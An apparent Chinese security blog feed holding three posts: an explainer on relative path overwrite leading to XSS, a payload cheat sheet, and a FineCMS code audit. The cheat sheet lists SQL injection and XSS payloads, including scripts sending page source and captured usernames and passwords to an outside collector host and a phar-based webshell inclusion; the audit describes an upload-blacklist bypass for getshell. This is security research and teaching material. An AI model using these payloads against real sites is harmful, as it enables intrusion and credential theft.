<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SeaFood&#39;s blog</title>
  <subtitle>es muss sein? es muss sein!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://5eafood.github.io/"/>
  <updated>2017-03-22T18:34:27.000Z</updated>
  <id>https://5eafood.github.io/</id>
  
  <author>
    <name>SeaFood</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RPO (Relative Path Overwrite) 相对路径覆盖</title>
    <link href="https://5eafood.github.io/2017/03/22/RPO/"/>
    <id>https://5eafood.github.io/2017/03/22/RPO/</id>
    <published>2017-03-22T15:14:48.000Z</published>
    <updated>2017-03-22T18:34:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RPO-Relative-Path-Overwrite-相对路径覆盖"><a href="#RPO-Relative-Path-Overwrite-相对路径覆盖" class="headerlink" title="RPO (Relative Path Overwrite) 相对路径覆盖"></a>RPO (Relative Path Overwrite) 相对路径覆盖</h1><hr>
<h2 id="什么RPO"><a href="#什么RPO" class="headerlink" title="什么RPO"></a>什么RPO</h2><p>RPO就是一种利用服务端与浏览器之间对 <strong>url编码</strong> 的处理方式不同所发起的攻击<br>可以导致Web页面引入非法的css文件和javascript文件导致xss<br><a id="more"></a></p>
<h2 id="RPO的原理"><a href="#RPO的原理" class="headerlink" title="RPO的原理"></a>RPO的原理</h2><p>我们访问<code>http://127.0.0.1/rpo/1/2/4/example.php</code>, 当页面以这种方式引入css或js文件时<br><code>&lt;link href=&quot;../../style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</code><br>浏览器加载的是<code>http://127.0.0.1/rpo/1/style.css</code>         </p>
<p>但如果将url改为<code>http://127.0.0.1/rpo/1%2f2/4/example.php</code>,服务器会解码%2f为’/‘<br>继续访问<code>http://127.0.0.1/rpo/1/2/4/example.php</code>而浏览器这会将<code>/1%2f2/</code>最为一段路径<br>加载<code>http://127.0.0.1/rpo/style.css</code></p>
<p>利用RPO需要Web页面以<strong>相对路径</strong>的css或js文件<br>需要注意的是apache要开启url自动解码需要在配置文件中加入<code>AllowEncodedSlashes On</code></p>
<h2 id="引入js文件攻击-1"><a href="#引入js文件攻击-1" class="headerlink" title="引入js文件攻击 (1)"></a>引入js文件攻击 (1)</h2><p><code>../</code>在url中表示上一级的意思利用这个我们可以加载到其他目录下的文件<br>页面以类似这种方式引入js文件时<br><code>&lt;script type=&quot;text/javascript&quot; src=&quot;../jquery.js&quot;&gt;&lt;/script&gt;</code><br>当我们访问<code>http://127.0.0.1/rpo/1/3/..%2f2/4/example.html</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务端 http://127.0.0.1/rpo/1/2/4/example.php</div><div class="line">正常加载应 &lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/rpo/1/jquery.js&quot;&gt;&lt;/script&gt;</div><div class="line">浏览器 http://127.0.0.1/rpo/1/3/..%2f2/4/example.php</div><div class="line">加载 http://127.0.0.1/rpo/1/3/jquery.js(evil)</div></pre></td></tr></table></figure></p>
<p>如果我们能得知上传文件路径通过RPO让Web页面用js解析我们上传的文件chrome不能将图片解析为js但可以将类似txt,doc,rar解析为js就能触发反射性xss<br>但这样利用局限很大要求我们能控制上传文件的文件名和文件目录名</p>
<h2 id="引入js文件攻击-2"><a href="#引入js文件攻击-2" class="headerlink" title="引入js文件攻击 (2)"></a>引入js文件攻击 (2)</h2><p>如果网站有上传和下载功能<br>页面以类似这种方式引入js文件时<br><code>&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt;</code><br>我们访问<code>http://127.0.0.1/rpo/download.php/..%2findex.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务端 http://127.0.0.1/rpo/index.php</div><div class="line">正常加载应 http://127.0.0.1/rpo/js/jquery.js</div><div class="line">浏览器 http://127.0.0.1/rpo/download.php/..%2findex.php</div><div class="line">加载 http://127.0.0.1/rpo/download.php/js/jquery.js</div></pre></td></tr></table></figure>
<p><code>http://127.0.0.1/rpo/download.php</code>下载的正是我们上传的恶意文件<br><img src="rpo/rpo1.png" alt=""></p>
<h2 id="引入恶意css文件攻击IE"><a href="#引入恶意css文件攻击IE" class="headerlink" title="引入恶意css文件攻击IE"></a>引入恶意css文件攻击IE</h2><p>当页面中提供类似搜索功能,能把搜索的字符串打印出来<br>页面以类似这种方式引入css文件时<br><code>&lt;link href=&quot;../../styles.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</code><br><code>http://127.0.0.1/ci/index.php/welcome/index/(string)</code>能打印搜索的字符串      </p>
<p>我们访问<br><code>http://127.0.0.1/ci/index.php/welcome/index/{}*{background:red}/..%2f..%2f..%2f../rpo/example.html</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务端 http://127.0.0.1/ci/rpo/example.html</div><div class="line">正常加载应 http://127.0.0.1/styles.css</div><div class="line">浏览器 http://127.0.0.1/ci/index.php/welcome/index/&#123;&#125;*&#123;background:red&#125;/..%2f..%2f..%2f../rpo/example.html</div><div class="line">加载 http://127.0.0.1/ci/index.php/welcome/index/&#123;&#125;*&#123;background:red&#125;</div></pre></td></tr></table></figure></p>
<p><code>http://127.0.0.1/ci/index.php/welcome/index/{}*{background:red}</code>此页面内的内容则包含了我们的恶意css代码浏览器忽视其他无关的内容正常执行</p>
<p><img src="images/rpo/rpo2.png" alt=""></p>
<p>在IE中可以使用<strong>expression()</strong>在css中执行js从达到xss攻击</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说RPO的攻击还是比较鸡肋的费了大力气也只能进行反射性xss攻击而已<del>我也是看完才知道这么鸡肋QAQ</del>,但思路很有意思搜索功能的利用很有创意<br>而且看了这么多英文文献突然又感觉过六级有望了QAQ</p>
<h2 id="文献"><a href="#文献" class="headerlink" title="文献"></a>文献</h2><p><a href="http://www.mbsd.jp/Whitepaper/rpo.pdf" target="_blank" rel="external">http://www.mbsd.jp/Whitepaper/rpo.pdf</a><br><a href="http://blog.portswigger.net/2015/02/prssi.html" target="_blank" rel="external">http://blog.portswigger.net/2015/02/prssi.html</a><br><a href="http://blog.innerht.ml/rpo-gadgets/" target="_blank" rel="external">http://blog.innerht.ml/rpo-gadgets/</a>                  </p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RPO-Relative-Path-Overwrite-相对路径覆盖&quot;&gt;&lt;a href=&quot;#RPO-Relative-Path-Overwrite-相对路径覆盖&quot; class=&quot;headerlink&quot; title=&quot;RPO (Relative Path Overwrite) 相对路径覆盖&quot;&gt;&lt;/a&gt;RPO (Relative Path Overwrite) 相对路径覆盖&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;什么RPO&quot;&gt;&lt;a href=&quot;#什么RPO&quot; class=&quot;headerlink&quot; title=&quot;什么RPO&quot;&gt;&lt;/a&gt;什么RPO&lt;/h2&gt;&lt;p&gt;RPO就是一种利用服务端与浏览器之间对 &lt;strong&gt;url编码&lt;/strong&gt; 的处理方式不同所发起的攻击&lt;br&gt;可以导致Web页面引入非法的css文件和javascript文件导致xss&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>笔记</title>
    <link href="https://5eafood.github.io/2017/03/22/Some-Notes/"/>
    <id>https://5eafood.github.io/2017/03/22/Some-Notes/</id>
    <published>2017-03-22T15:14:48.000Z</published>
    <updated>2017-03-22T15:18:58.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><hr>
<p>一些会用到的payload收集起来避免临时去找不定期更新</p>
<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>select username from user where username like binary(0x66);   binary() 将十六进制0x或二进制0b转为字符串<br>select 1 from (select username from user where username=’’);<br>where username between ‘a’ and ‘z’   between 0x61 and 0x7a<br>wherer username regexp ‘’;<br>mid() left() substr() substring() ascii() ord() strcmp(left(‘password’,1), 0x70) = 0</p>
<h3 id="延迟注入"><a href="#延迟注入" class="headerlink" title="延迟注入"></a>延迟注入</h3><p>if( length(database())&gt;4, sleep(0),sleep(5));<br>if( 1=mid( lpad(  bin( ord(  mid(  select @@version  1,1)  )  )   ,8,0)   ,1,1), sleep(0), sleep(5));<br>benchmark() 执行次数 执行动作</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>SELECT 1 FROM (select count(<em>),concat(floor(rand(0)</em>2),(select concat(0x20,(select username from user limit 0,1),0x20,user(),0x20,version())))a from information_schema.tables group by a)b;<br>select exp(~(select*from(select user())x));  ~取反 exp溢出报错<br><a href="http://blackfan.ru/mysql_game_v2/" target="_blank" rel="external">http://blackfan.ru/mysql_game_v2/</a>  </p>
<h3 id="读数据"><a href="#读数据" class="headerlink" title="读数据"></a>读数据</h3><p>库名 select schema_name from information_schema.SCHEMATA<br>表名 select table_name from information_schema.tables where table_schema=database()<br>字段 select column_name from information_schema.columns where table_name=<br>select GROUP_CONCAT(DISTINCT table_name) from information_schema.columns               </p>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>权限要求高<br>select hex(load_file(0x…));<br>select 0x… into outfile ‘path’;  dumpfile</p>
<h3 id="绕过滤"><a href="#绕过滤" class="headerlink" title="绕过滤"></a>绕过滤</h3><p><code>where 1=0.0union select</code> 小数后面可以直接接命令,可以用做绕正则<br>union select 逗号不能用时 可以用join构造列  <code>select * from (select 1 as a)x join (select 2 as b)y;</code><br>/<em>*/  \x0d\x0a  /</em>!11111select*/  select(username)from(user)  宽字节%df<br>unicode同形字<a href="http://www.irongeek.com/homoglyph-attack-generator.php" target="_blank" rel="external">http://www.irongeek.com/homoglyph-attack-generator.php</a>        </p>
<blockquote>
<p>MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立,对于utf8_general_ci下面的等式成立ß = s 但是对于utf8_unicode_ci下面等式才成立ß = ss </p>
</blockquote>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">''</span> &gt;</span><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">;</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">''</span> &gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.location.href='';</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="ajax"><a href="#ajax" class="headerlink" title="ajax"></a>ajax</h3><p>ajax要注意跨域问题<br><code>header(&#39;Access-Control-Allow-Origin: *&#39;);</code>        </p>
<h4 id="xmlhttp"><a href="#xmlhttp" class="headerlink" title="xmlhttp"></a>xmlhttp</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"https://"</span>, <span class="literal">true</span>);</div><div class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">xmlhttp.send(<span class="string">"data="</span> + data);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure>
<p>获得页面源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;window.location.href=http://domain/rec.php?x=escape(xmlhttp.responseText) &lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h4 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;script src=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">&lt;script&gt;</div><div class="line">$.get(<span class="string">'url'</span>,callback);</div><div class="line"></div><div class="line">$.post(<span class="string">'url'</span>,&#123;</div><div class="line">    <span class="attr">data1</span>:<span class="string">''</span>,<span class="attr">data2</span>:<span class="string">''</span>&#125;, callback)</div><div class="line"></div><div class="line">$.ajax(&#123;</div><div class="line">    <span class="attr">type</span>:<span class="string">"get/post"</span></div><div class="line">    url:<span class="string">""</span>,</div><div class="line">    <span class="attr">data</span>:<span class="string">""</span>,</div><div class="line">    <span class="attr">success</span>:fuction()&#123;&#125;,</div><div class="line">&#125;)</div><div class="line"></div><div class="line">$.getScript(<span class="string">'url'</span>)</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
<h3 id="表单劫持"><a href="#表单劫持" class="headerlink" title="表单劫持"></a>表单劫持</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_form</span>(<span class="params">user</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</div><div class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(f);</div><div class="line"><span class="keyword">var</span> e1 = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">e1.type = <span class="string">"text"</span>;</div><div class="line">e1.name = e1.id = <span class="string">"username"</span>;</div><div class="line">e1.value = user;</div><div class="line">f.appendChild(e1);</div><div class="line"><span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">e.name = e.type = e.id = <span class="string">"password"</span>;</div><div class="line">f.appendChild(e);</div><div class="line"></div><div class="line">$.get(<span class="string">'http://domain/rec.php?username='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.getElementById(<span class="string">"username"</span>).value)+<span class="string">'password='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>).value));</div></pre></td></tr></table></figure>
<h3 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;         </div><div class="line">s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;你的js地址&apos;               </div><div class="line">&lt;iframe src=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">"&lt;img src=/ onerror=javascript:document.write(String.fromCharCode(&#123;&#125;));&gt;"</span>.format(<span class="string">','</span>.join([str(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> realpayload]))</div></pre></td></tr></table></figure>
<p>利用prefetch绕csp <code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//abcd1234.attacker.ch&quot;&gt;</code> </p>
<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h3><p>读源码<code>php://filter/convert.base64-encode/resource=</code><br>包含zip 将shell.php压缩为zip改名为aa.jpg上传后包含<code>phar://path/aa.jpg/shell</code>   当已知phpinfo时可以包含临时文件</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;笔记&quot;&gt;&lt;a href=&quot;#笔记&quot; class=&quot;headerlink&quot; title=&quot;笔记&quot;&gt;&lt;/a&gt;笔记&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;一些会用到的payload收集起来避免临时去找不定期更新&lt;/p&gt;
&lt;h2 id=&quot;sqli&quot;&gt;&lt;a href=&quot;#sqli&quot; cl
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>finecms代码审计</title>
    <link href="https://5eafood.github.io/2017/03/22/finecms/"/>
    <id>https://5eafood.github.io/2017/03/22/finecms/</id>
    <published>2017-03-22T15:14:40.000Z</published>
    <updated>2017-03-22T15:16:29.700Z</updated>
    
    <content type="html"><![CDATA[<h1 id="finecms代码审计"><a href="#finecms代码审计" class="headerlink" title="finecms代码审计"></a>finecms代码审计</h1><hr>
<h1 id="后台sql注入"><a href="#后台sql注入" class="headerlink" title="后台sql注入"></a>后台sql注入</h1><p>搜索功能的$kw变量都没进入过滤函数用的类似<code>like &quot;%$kw%&quot;</code>语句但前台的搜索使用双引号<code>&quot;</code>包的<br>似乎是被codeigniter的xss保护滤掉了=_= 然而后台几个搜索是用单引号<code>&#39;</code>可以利用毕竟后台就比较鸡肋了      </p>
<p><code>FineCMS2.10\controllers\admin\ContentController.php</code><br><img src="images/finecms/finecms1.png" alt=""></p>
<p><code>FineCMS2.10\controllers\admin\MemberController.php</code><br><img src="images/finecms/finecms2.png" alt=""></p>
<p><code>FineCMS2.10\controllers\admin\RelatedlinkController.php</code><br><img src="images/finecms/finecms3.png" alt=""></p>
<p><img src="images/finecms/finecms4.png" alt=""></p>
<p>投了补天没过因为后台漏洞是不行的没看清漏洞要求QAQ</p>
<h1 id="恶意文件上传"><a href="#恶意文件上传" class="headerlink" title="恶意文件上传"></a>恶意文件上传</h1><p><code>controllers\AttachmentController.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filesAction</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;memberCheck();</div><div class="line">        $setting = urldecode(<span class="keyword">$this</span>-&gt;get(<span class="string">'setting'</span>));</div><div class="line">        <span class="keyword">list</span>($type, $size) = explode(<span class="string">'|'</span>, $setting);</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($type) || <span class="keyword">empty</span>($size)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;attMsg(lang(<span class="string">'att-10'</span>));</div><div class="line">        &#125;</div><div class="line">        $type = base64_decode($type);</div><div class="line">        $data = <span class="string">''</span>;</div><div class="line">        $_type = explode(<span class="string">','</span>, $type);</div><div class="line">        <span class="keyword">foreach</span> ($_type <span class="keyword">as</span> $t) &#123;</div><div class="line">            $data.= <span class="string">'*.'</span> . $t . <span class="string">';'</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;view-&gt;assign(<span class="keyword">array</span>(</div><div class="line">            <span class="string">'size'</span> =&gt; (int)$size,</div><div class="line">            <span class="string">'type'</span> =&gt; $type,</div><div class="line">            <span class="string">'data'</span> =&gt; $data,</div><div class="line"><span class="string">'admin'</span> =&gt; <span class="keyword">$this</span>-&gt;getAdmin(),</div><div class="line">            <span class="string">'filesize'</span> =&gt; <span class="number">1024</span> * $size, <span class="comment">//转换成MB</span></div><div class="line">            <span class="string">'sessionid'</span> =&gt; session_id(),</div><div class="line"><span class="string">'document'</span> =&gt; <span class="keyword">$this</span>-&gt;get(<span class="string">'document'</span>)</div><div class="line">        ));</div><div class="line">        <span class="keyword">$this</span>-&gt;view-&gt;display(<span class="string">'../admin/attachment_swfupload'</span>);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p><code>$type</code>参数是post可控的上传文件后缀就是<code>$type</code>的base64解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ext = $upload-&gt;fileext();</div><div class="line"><span class="keyword">if</span> (stripos($ext, <span class="string">'php'</span>) !== <span class="keyword">FALSE</span></div><div class="line">|| stripos($ext, <span class="string">'asp'</span>) !== <span class="keyword">FALSE</span></div><div class="line">|| stripos($ext, <span class="string">'aspx'</span>) !== <span class="keyword">FALSE</span></div><div class="line">) &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'result'</span> =&gt; <span class="string">'文件格式被系统禁止'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>后缀名只做了基础的黑名单限制但在ubuntu和debian下的lamp可以解析<strong>pht</strong>和<strong>phtml</strong>为php文件        </p>
<p>我们可以上传.pht文件getshell<br><img src="images/finecms/finecms5.png" alt=""><br><code>emlwLHJhcg==</code>为<code>&quot;zip,rar&quot;.encode(base64)</code>我们将他改为pht的base64<br><img src="images/finecms/finecms6.png" alt=""><br><img src="images/finecms/finecms7.png" alt=""></p>
<p>xp下无法解析pht但kali下可以<br><img src="images/finecms/finecms8.png" alt=""></p>
<p>这个投的补天结果被人先投了TAT其实我很早就找到了但忘记提交了TAT</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;finecms代码审计&quot;&gt;&lt;a href=&quot;#finecms代码审计&quot; class=&quot;headerlink&quot; title=&quot;finecms代码审计&quot;&gt;&lt;/a&gt;finecms代码审计&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id=&quot;后台sql注入&quot;&gt;&lt;a href=&quot;#后台sql
    
    </summary>
    
    
  </entry>
  
</feed>
